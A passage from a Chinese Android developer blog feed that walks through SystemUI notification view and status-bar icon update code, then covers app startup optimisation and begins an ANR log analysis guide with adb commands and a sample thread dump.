mRowInflaterTaskProvider.get().inflate(mContext, parent, entry,</span><br><span class="line">                row -&gt; &#123;</span><br><span class="line">                    <span class="comment">// 为视图设置控制器.</span></span><br><span class="line">                    <span class="type">ExpandableNotificationRowComponent</span> <span class="variable">component</span> <span class="operator">=</span></span><br><span class="line">                            mExpandableNotificationRowComponentBuilder</span><br><span class="line">                                    .expandableNotificationRow(row)</span><br><span class="line">                                    .notificationEntry(entry)</span><br><span class="line">                                    .onExpandClickListener(mPresenter)</span><br><span class="line">                                    .listContainer(mListContainer)</span><br><span class="line">                                    .build();</span><br><span class="line">                    <span class="type">ExpandableNotificationRowController</span> <span class="variable">rowController</span> <span class="operator">=</span></span><br><span class="line">                            component.getExpandableNotificationRowController();</span><br><span class="line">                    rowController.init(entry);</span><br><span class="line">                    entry.setRowController(rowController);</span><br><span class="line">                    bindRow(entry, row);</span><br><span class="line">                    updateRow(entry, row);</span><br><span class="line">                    inflateContentViews(entry, params, row, callback);</span><br><span class="line">                &#125;);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>上面无论走哪个分支，最后进入到inflateContentViews(entry, row, callback);这是一个回调：<br><strong>NotificationRowBinderImpl#inflateContentViews()</strong><br><strong>frameworks/base/packages/SystemUI/src/com/android/systemui/statusbar/notification/collection/inflation/NotificationRowBinderImpl.java</strong></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 加载该行的基本内容视图</span></span><br><span class="line"><span class="keyword">private</span> <span class="keyword">void</span> <span class="title function_">inflateContentViews</span><span class="params">(</span></span><br><span class="line"><span class="params">        NotificationEntry entry,</span></span><br><span class="line"><span class="params">        NotifInflater.Params inflaterParams,</span></span><br><span class="line"><span class="params">        ExpandableNotificationRow row,</span></span><br><span class="line"><span class="params">        <span class="meta">@Nullable</span> NotificationRowContentBinder.InflationCallback inflationCallback)</span> &#123;</span><br><span class="line">    </span><br><span class="line">        <span class="comment">// 省略部分代码......</span></span><br><span class="line">    params.rebindAllContentViews();</span><br><span class="line">    mRowContentBindStage.requestRebind(entry, en -&gt; &#123;</span><br><span class="line">        row.setUsesIncreasedCollapsedHeight(useIncreasedCollapsedHeight);</span><br><span class="line">        row.setIsLowPriority(isLowPriority);</span><br><span class="line">        <span class="keyword">if</span> (inflationCallback != <span class="literal">null</span>) &#123;</span><br><span class="line">            inflationCallback.onAsyncInflationFinished(en);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>inflationCallback 是 NotificationRowContentBinder 的一个内部接口；在 NotificationEntryManager 中被实现，所以将回调到 <strong>NotificationEntryManager#onAsyncInflationFinished()</strong> 中。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// NotificationEntryManager.java</span></span><br><span class="line"><span class="meta">@Override</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">onAsyncInflationFinished</span><span class="params">(NotificationEntry entry)</span> &#123;</span><br><span class="line">    Trace.beginSection(<span class="string">&quot;NotificationEntryManager.onAsyncInflationFinished&quot;</span>);</span><br><span class="line">    mPendingNotifications.remove(entry.getKey());</span><br><span class="line">    <span class="comment">// If there was an async task started after the removal, we don&#x27;t want to add it back to</span></span><br><span class="line">    <span class="comment">// the list, otherwise we might get leaks.</span></span><br><span class="line">    <span class="keyword">if</span> (!entry.isRowRemoved()) &#123;</span><br><span class="line">        <span class="type">boolean</span> <span class="variable">isNew</span> <span class="operator">=</span> getActiveNotificationUnfiltered(entry.getKey()) == <span class="literal">null</span>;</span><br><span class="line">            <span class="comment">// 省略部分代码......</span></span><br><span class="line">        <span class="keyword">if</span> (isNew) &#123;</span><br><span class="line">            <span class="comment">// 省略部分代码......</span></span><br><span class="line">            <span class="comment">// 添加一个notification会走到这里、</span></span><br><span class="line">            <span class="comment">// 包括一开机就显示出来的那些notification</span></span><br><span class="line">            addActiveNotification(entry);</span><br><span class="line">            <span class="comment">// 更新视图</span></span><br><span class="line">            updateNotifications(<span class="string">&quot;onAsyncInflationFinished&quot;</span>);</span><br><span class="line">            <span class="comment">// 省略部分代码......</span></span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="comment">// 省略部分代码......</span></span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    Trace.endSection();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这里直接看 updateNotifications(“onAsyncInflationFinished”) 方法；<br><strong>NotificationEntryManager#updateNotification()</strong></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// NotificationEntryManager.java</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">updateNotifications</span><span class="params">(String reason)</span> &#123;</span><br><span class="line">    <span class="comment">// 省略部分代码......</span></span><br><span class="line">    <span class="keyword">if</span> (mPresenter != <span class="literal">null</span>) &#123;</span><br><span class="line">        <span class="comment">// 更新视图</span></span><br><span class="line">        mPresenter.updateNotificationViews(reason);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">// 省略部分代码......</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>mPresenter 的实现类是 StatusBarNotificationPresenter，所以接着看其里面的 updateNotificationViews() 方法。<br><strong>StatusBarNotificationPresenter#updateNotificationViews()</strong><br><strong>frameworks/base/packages/SystemUI/src/com/android/systemui/statusbar/phone/StatusBarNotificationPresenter.java</strong></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@Override</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">updateNotificationViews</span><span class="params">(<span class="keyword">final</span> String reason)</span> &#123;</span><br><span class="line">    <span class="keyword">if</span> (!mNotifPipelineFlags.checkLegacyPipelineEnabled()) &#123;</span><br><span class="line">        <span class="keyword">return</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">// The function updateRowStates depends on both of these being non-null, so check them here.</span></span><br><span class="line">    <span class="comment">// We may be called before they are set from DeviceProvisionedController&#x27;s callback.</span></span><br><span class="line">    <span class="keyword">if</span> (mScrimController == <span class="literal">null</span>) <span class="keyword">return</span>;</span><br><span class="line">    <span class="comment">// 不要在折叠期间修改通知。.</span></span><br><span class="line">    <span class="keyword">if</span> (isCollapsing()) &#123;</span><br><span class="line">        mShadeController.addPostCollapseAction(() -&gt; updateNotificationViews(reason));</span><br><span class="line">        <span class="keyword">return</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">// 把通知视图添加到通知面版的通知栏中</span></span><br><span class="line">    mViewHierarchyManager.updateNotificationViews();</span><br><span class="line">    <span class="comment">// 这里不仅仅更新了通知面版的通知视图，也更新了状态栏的通知图标</span></span><br><span class="line">    mNotificationPanel.updateNotificationViews(reason);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>我们这里看通知面板更新，即 mNotificationPanel.updateNotificationViews(reason) 方法。mNotificationPanel 为 NotificationPanelViewController 的对象。<br><strong>NotificationPanelViewController#updateNotificationViews(reason)</strong><br><strong>frameworks/base/packages/SystemUI/src/com/android/systemui/shade/NotificationPanelViewController.java</strong></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 更新通知视图的部分和状态栏图标。每当显示的基础通知数据发生更改时，</span></span><br><span class="line"><span class="comment">// 这由 NotificationPresenter 触发。</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">updateNotificationViews</span><span class="params">(String reason)</span> &#123;</span><br><span class="line">    <span class="comment">// 更新NotificationStackScrollLayout 这个视图类的各种信息</span></span><br><span class="line">    <span class="comment">// updateSectionBoundaries() 这个方法还没弄明白，但我估计是添加/删除视图后布局重新定位，以及一个</span></span><br><span class="line">    mNotificationStackScrollLayoutController.updateSectionBoundaries(reason);</span><br><span class="line">    <span class="comment">// Footer 其实就是通知面板底部的两个按钮：“管理”、“全部清除”。</span></span><br><span class="line">    mNotificationStackScrollLayoutController.updateFooter();</span><br><span class="line">    <span class="comment">// 更新状态栏的通知图标</span></span><br><span class="line">    mNotificationIconAreaController.updateNotificationIcons(createVisibleEntriesList());</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>至此通知面板的视图完成添加、更新。<br>下面接着看下状态栏的通知图标更新：<br><strong>NotificationIconAreaController#updateNotificationIcons()</strong><br><strong>frameworks/base/packages/SystemUI/src/com/android/systemui/statusbar/phone/NotificationIconAreaController.java</strong></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">updateNotificationIcons</span><span class="params">(List&lt;ListEntry&gt; entries)</span> &#123;</span><br><span class="line">    mNotificationEntries = entries;</span><br><span class="line">    updateNotificationIcons();</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">private</span> <span class="keyword">void</span> <span class="title function_">updateNotificationIcons</span><span class="params">()</span> &#123;</span><br><span class="line">    Trace.beginSection(<span class="string">&quot;NotificationIconAreaController.updateNotificationIcons&quot;</span>);</span><br><span class="line">        <span class="comment">// 更新状态栏图标</span></span><br><span class="line">    updateStatusBarIcons();</span><br><span class="line">    updateShelfIcons();</span><br><span class="line">    <span class="comment">// 更新 Aod 通知图标</span></span><br><span class="line">    updateAodNotificationIcons();</span><br><span class="line">    <span class="comment">// 应用通知图标色调</span></span><br><span class="line">    applyNotificationIconsTint();</span><br><span class="line">    Trace.endSection();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>下面都是调用 update XXX Icons() 这种类似的方法，接着调用 updateIconsForLayout() 方法，我们直接分析<br><strong>NotificationIconAreaController#updateIconsForLayout()：</strong><br><strong>frameworks/base/packages/SystemUI/src/com/android/systemui/statusbar/phone/NotificationIconAreaController.java</strong></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">private</span> <span class="keyword">void</span> <span class="title function_">updateIconsForLayout</span><span class="params">(Function&lt;NotificationEntry, StatusBarIconView&gt; function,</span></span><br><span class="line"><span class="params">        NotificationIconContainer hostLayout, <span class="type">boolean</span> showAmbient, <span class="type">boolean</span> showLowPriority,</span></span><br><span class="line"><span class="params">        <span class="type">boolean</span> hideDismissed, <span class="type">boolean</span> hideRepliedMessages, <span class="type">boolean</span> hideCurrentMedia,</span></span><br><span class="line"><span class="params">        <span class="type">boolean</span> hideCenteredIcon)</span> &#123;</span><br><span class="line">    <span class="comment">// toShow保存即将显示的图标</span></span><br><span class="line">    ArrayList&lt;StatusBarIconView&gt; toShow = <span class="keyword">new</span> <span class="title class_">ArrayList</span>&lt;&gt;(</span><br><span class="line">            mNotificationScrollLayout.getChildCount());</span><br><span class="line">    <span class="comment">// 过滤通知，并保存需要显示的通知图标</span></span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> <span class="number">0</span>; i &lt; mNotificationScrollLayout.getChildCount(); i++) &#123;</span><br><span class="line">        <span class="comment">// 获取一个通知视图</span></span><br><span class="line">        <span class="type">View</span> <span class="variable">view</span> <span class="operator">=</span> mNotificationScrollLayout.getChildAt(i);</span><br><span class="line">        <span class="keyword">if</span> (view <span class="keyword">instanceof</span> ExpandableNotificationRow) &#123;</span><br><span class="line">            <span class="type">NotificationEntry</span> <span class="variable">ent</span> <span class="operator">=</span> ((ExpandableNotificationRow) view).getEntry();</span><br><span class="line">            <span class="keyword">if</span> (shouldShowNotificationIcon(ent, showAmbient, showLowPriority, hideDismissed,</span><br><span class="line">                    hideRepliedMessages, hideCurrentMedia, hideCenteredIcon)) &#123;</span><br><span class="line">                <span class="comment">// 获取图标</span></span><br><span class="line">                <span class="type">StatusBarIconView</span> <span class="variable">iconView</span> <span class="operator">=</span> function.apply(ent);</span><br><span class="line">                <span class="keyword">if</span> (iconView != <span class="literal">null</span>) &#123;</span><br><span class="line">                    toShow.add(iconView);</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">// ...</span></span><br><span class="line">    <span class="comment">// 把需要显示的图标添加到hostLayout中</span></span><br><span class="line">    <span class="keyword">final</span> FrameLayout.<span class="type">LayoutParams</span> <span class="variable">params</span> <span class="operator">=</span> generateIconLayoutParams();</span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> <span class="number">0</span>; i &lt; toShow.size(); i++) &#123;</span><br><span class="line">        <span class="type">StatusBarIconView</span> <span class="variable">v</span> <span class="operator">=</span> toShow.get(i);</span><br><span class="line">        <span class="comment">// 如果刚刚删除并再次添加，视图可能仍会暂时添加</span></span><br><span class="line">        hostLayout.removeTransientView(v);</span><br><span class="line">        <span class="keyword">if</span> (v.getParent() == <span class="literal">null</span>) &#123;</span><br><span class="line">            <span class="keyword">if</span> (hideDismissed) &#123;</span><br><span class="line">                v.setOnDismissListener(mUpdateStatusBarIcons);</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="comment">// 执行到最后是 NotificationIconContainer.addView 添加视图</span></span><br><span class="line">            <span class="comment">// NotificationIconContainer本身没有addView、removeView方法，</span></span><br><span class="line">            <span class="comment">// 最终走的是其多层下去的父类ViewGroup的方法</span></span><br><span class="line">            hostLayout.addView(v, i, params);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">// ...</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> 技术 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Android </tag>
            
            <tag> framework </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>应用启动的优化措施</title>
      <link href="/2024/01/21/2024-01-21/"/>
      <url>/2024/01/21/2024-01-21/</url>
      
        <content type="html"><![CDATA[<h3 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h3><p>对于应用启动到底合不合格，除了固定的指标之外，还有一点就是跟对比机之间进行测试对比，看有没有差距。如果不达标或者跟对比机有差距，那就要对应用启动进行优化。<br>对于性能差距的分析，需要抓取traces查看两台机器之间是否有区别。</p><h3 id="对比"><a href="#对比" class="headerlink" title="对比"></a>对比</h3><p>抓取traces后，不仅要跟对比机进行对比，也要跟正常的traces进行对比，发现是哪个环节出了问题，究竟是哪一个流程比正常的慢。</p><h4 id="Running-State"><a href="#Running-State" class="headerlink" title="Running State"></a>Running State</h4><p>对于正在运行的CPU，我们要从以下几个维度去分析</p><ul><li>CPU的频率是否正常，有没有添加限制或者跟对比机相同。</li><li>CPU的架构跟对比机是否一样，有的CPU会因为架构的原因对机器本身的性能产生了限制，例如KI7的A88CPU是6小核2大核，它在其他所有条件都相同的情况下一定跑不过4大核4小核的机器。</li><li>如果CPU性能和架构都差不多，那就要看CPU上是否任务过重，把有些优先级没那么重要的线程延后或者放到小核去做。</li><li>DDR频率是否一样</li><li>Android版本的差距</li></ul><p><img src="/images/20240121/202401211333.png"></p><p>如上图所示，这是淘宝启动的时候CPU的变化，频率在启动的时候直接被拉满，并且淘宝有关的线程大多都放在了大核上去做。</p><h4 id="Runnable-State"><a href="#Runnable-State" class="headerlink" title="Runnable State"></a>Runnable State</h4><p>可运行的CPU上面，我们可以看这几个差距</p><ul><li>首先看线程的设定，有没有被其他线程抢占优先级，可以先对线程优先级进行调整</li><li>可以查看有没有其他较为空闲的CPU，如果有的话可以调整上去</li><li>如果还是不行，就要查看CPU有没有异常背景导致任务过重找问题优化线程</li></ul><blockquote><p>CPU Loading计算： Totals time/(Selection extent time<em>Online CPU Number）</em>100%<br>如果CPU Loading&gt;85%，基本确认有loading 重的嫌疑</p></blockquote><p>在了解了这些后，优化应用启动的时间主要依据下面几点</p><ol><li>提高CPU频率</li><li>提高DDR频率</li><li>拉长CPU和DDR提频时长</li><li>在可以减少动画播放的地方关闭动画</li><li>在应用安装的时候进行预编译，减少启动时长</li><li>在app白名单内专门进行配置</li><li>将启动时用到的线程跑在大核</li><li>在启动时尽量不使用网络IO</li></ol><h4 id="冷启动与热启动"><a href="#冷启动与热启动" class="headerlink" title="冷启动与热启动"></a>冷启动与热启动</h4><p>冷启动耗时统计<br>adb 命令统计<br><strong>adb命令 : adb shell am start -S -W 包名/启动类的全限定名 ， -S 表示重启当前应用</strong></p><p><img src="/images/20240121/202401211341.png"></p><ol><li>在第①个时间段内，AMS 创建 ActivityRecord 记录块和选择合理的 Task、将当前Resume 的Activity 进行 pause.</li><li>在第②个时间段内，启动进程、调用无界面 Activity 的 onCreate() 等、 pause/finish 无界面的Activity.</li><li>在第③个时间段内，调用有界面 Activity 的 onCreate、onResum</li></ol><p>如果需要统计从点击桌面图标到 Activity 启动完毕，可以用WaitTime作为标准。</p>]]></content>
      
      
      <categories>
          
          <category> 技术 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Android </tag>
            
            <tag> framework </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>ANR问题分析总结</title>
      <link href="/2024/01/20/2024-01-20/"/>
      <url>/2024/01/20/2024-01-20/</url>
      
        <content type="html"><![CDATA[<h3 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h3><p>ANR(Application Not Responding)应用程序无响应。如果你应用程序在 UI 线程被阻塞太长时间，就会出现 ANR，通常出现 ANR，系统会弹出一个提示提示框，让用户知道，该程序正在被阻塞，是否继续等待还是关闭。</p><h4 id="ANR类型"><a href="#ANR类型" class="headerlink" title="ANR类型"></a>ANR类型</h4><p>出现ANR的一般有以下几种类型：</p><table><thead><tr><th>类型</th><th>说明</th><th>logcat日志关键字</th></tr></thead><tbody><tr><td>KeyDispatchTimeout(常见)</td><td>input事件在5S内没有处理完成发生了ANR</td><td>Input event dispatching timed out</td></tr><tr><td>BroadcastTimeout</td><td>前台Broadcast：onReceiver在10S内没有处理完成发生ANR<br> 后台Broadcast：onReceiver在60s内没有处理完成发生ANR</td><td>Timeout of broadcast BroadcastRecord</td></tr><tr><td>ServiceTimeout</td><td>前台Service：onCreate，onStart，onBind等生命周期在20s内没有处理完成发生ANR<br>后台Service：onCreate，onStart，onBind等生命周期在200s内没有处理完成发生ANR</td><td>Timeout executing service</td></tr><tr><td>ContentProviderTimeout</td><td>ContentProvider 在10S内没有处理完成发生ANR</td><td>timeout publishing content providers</td></tr></tbody></table><h4 id="一、导出并查看-ANR-日志"><a href="#一、导出并查看-ANR-日志" class="headerlink" title="一、导出并查看 ANR 日志"></a>一、导出并查看 ANR 日志</h4><p>执行命令：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">adb bugreport bugreport.zip</span><br><span class="line">adb pull /data/debuglogger/mobilelog</span><br></pre></td></tr></table></figure><p>可以导出设备所有 bug 日志，执行命令后，在指定文件夹内得到一个 zip 文件，将文件解压后打开，文件目录如下所示：</p><p><img src="/images/20240120/202401201046.png"></p><p>其中，设备的 anr 日志会保存在该路径下：C:\Users\xxx\Desktop\bugreport\FS\data\anr，如图：</p><p><img src="/images/20240120/202401201047.png"></p><p>另外，该文件 C:\Users\xxx\Desktop\bugreport\bugreport-100110603-TP1A.220624.014-2022-10-12-09-49-59.txt 内也有有 anr 日志的打印，我们可以通过以下关键词搜索该文件的一些异常信息，如：</p><ul><li>“main” prio= 搜索 anr 相关信息</li><li>beginning of crash 搜索 crash 相关信息</li><li>CPU usage from 搜索 cpu 使用信息</li></ul><h4 id="二、ANR-日志如何分析"><a href="#二、ANR-日志如何分析" class="headerlink" title="二、ANR 日志如何分析"></a>二、ANR 日志如何分析</h4><p>一个 ANR 日志，会包含当前设备中所有进程的使用情况，每个进程开头都会<br>以 <strong>—– pid 17376 at date —–</strong> 来开头，<br>以 <strong>—– end 17376 —–</strong> 来结尾，<br>如下所示：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">----- pid 17376 at 2022-10-11 09:52:04.264664750+0800 -----</span><br><span class="line">Cmd line: com.android.vending</span><br><span class="line">...</span><br><span class="line">...</span><br><span class="line">...</span><br><span class="line">----- end 17376 -----</span><br></pre></td></tr></table></figure><p>另外，每个进程日志中都会有一些进程内存相关的信息，如：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">----- pid 17376 at 2022-06-16 16:56:04 -----</span><br><span class="line">Cmd line: com.android.vending</span><br><span class="line">...</span><br><span class="line">...</span><br><span class="line">Total number of allocations 274640   // 进程创建到现在一共创建了多少对象</span><br><span class="line">Total bytes allocated 13MB   // 进程创建到现在一共申请了多少内存</span><br><span class="line">Total bytes freed 5821KB   // 进程创建到现在一共释放了多少内存</span><br><span class="line">Free memory 4562KB   // 空闲内存（可用内存）</span><br><span class="line">Free memory until GC 4562KB   // GC前的空闲内存</span><br><span class="line">Free memory until OOME 248MB   // OOM之前的可用内存，当这个值很小的时候，已经处于内存紧张状态，应用可能占用了过多的内存</span><br><span class="line">Total memory11MB  // 当前总内存（已用+可用）</span><br><span class="line">Max memory 256MB  // 进程最多能申请的内存 </span><br><span class="line">...</span><br><span class="line">----- end 17376 -----</span><br></pre></td></tr></table></figure><p>另外，每个进程日志中都会有进程堆栈信息，堆栈信息非常重要，它展示了发生 ANR 的进程当前的所有线程状态。如下所示：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br></pre></td><td class="code"><pre><span class="line">----- pid 17376 at 2022-06-16 16:56:04 -----</span><br><span class="line">Cmd line: com.android.vending</span><br><span class="line">...</span><br><span class="line"><span class="built_in">suspend</span> all histogram:  Sum: 141.888ms 99% C.I. 0.012ms-91.709ms Avg: 4.892ms Max: 100.514ms</span><br><span class="line">DALVIK THREADS (56):</span><br><span class="line"><span class="string">&quot;Signal Catcher&quot;</span> daemon prio=10 tid=6 Runnable</span><br><span class="line">  | group=<span class="string">&quot;system&quot;</span> sCount=0 ucsCount=0 flags=0 obj=0x132c08e0 self=0xb400007dceb186f0</span><br><span class="line">  | sysTid=17386 <span class="built_in">nice</span>=-20 cgrp=default <span class="built_in">sched</span>=0/0 handle=0x7c47bdbcb0</span><br><span class="line">  | state=R schedstat=( 44080464 23366075 22 ) utm=3 stm=0 core=2 HZ=100</span><br><span class="line">  | stack=0x7c47ae4000-0x7c47ae6000 stackSize=991KB</span><br><span class="line">  | held mutexes= <span class="string">&quot;mutator lock&quot;</span>(shared held)</span><br><span class="line">  native: <span class="comment">#00 pc 00000000005376cc  /apex/com.android.art/lib64/libart.so (art::DumpNativeStack(std::__1::basic_ostream&lt;char, std::__1::char_traits&lt;char&gt; &gt;&amp;, int, BacktraceMap*, char const*, art::ArtMethod*, void*, bool)+128) (BuildId: 56e704c544e6c624201be2ab4933e853)</span></span><br><span class="line">  native: <span class="comment">#01 pc 00000000006f0e24  /apex/com.android.art/lib64/libart.so (art::Thread::DumpStack(std::__1::basic_ostream&lt;char, std::__1::char_traits&lt;char&gt; &gt;&amp;, bool, BacktraceMap*, bool) const+236) (BuildId: 56e704c544e6c624201be2ab4933e853)</span></span><br><span class="line">  native: <span class="comment">#02 pc 00000000006fe6b0  /apex/com.android.art/lib64/libart.so (art::DumpCheckpoint::Run(art::Thread*)+208) (BuildId: 56e704c544e6c624201be2ab4933e853)</span></span><br><span class="line">  native: <span class="comment">#03 pc 0000000000364174  /apex/com.android.art/lib64/libart.so (art::ThreadList::RunCheckpoint(art::Closure*, art::Closure*)+440) (BuildId: 56e704c544e6c624201be2ab4933e853)</span></span><br><span class="line">  native: <span class="comment">#04 pc 00000000006fce50  /apex/com.android.art/lib64/libart.so (art::ThreadList::Dump(std::__1::basic_ostream&lt;char, std::__1::char_traits&lt;char&gt; &gt;&amp;, bool)+280) (BuildId: 56e704c544e6c624201be2ab4933e853)</span></span><br><span class="line">  native: <span class="comment">#05 pc 00000000006fc844  /apex/com.android.art/lib64/libart.so (art::ThreadList::DumpForSigQuit(std::__1::basic_ostream&lt;char, std::__1::char_traits&lt;char&gt; &gt;&amp;)+292) (BuildId: 56e704c544e6c624201be2ab4933e853)</span></span><br><span class="line">  native: <span class="comment">#06 pc 00000000006d5914  /apex/com.android.art/lib64/libart.so (art::Runtime::DumpForSigQuit(std::__1::basic_ostream&lt;char, std::__1::char_traits&lt;char&gt; &gt;&amp;)+184) (BuildId: 56e704c544e6c624201be2ab4933e853)</span></span><br><span class="line">  native: <span class="comment">#07 pc 00000000006e19c0  /apex/com.android.art/lib64/libart.so (art::SignalCatcher::HandleSigQuit()+468) (BuildId: 56e704c544e6c624201be2ab4933e853)</span></span><br><span class="line">  native: <span class="comment">#08 pc 0000000000573e40  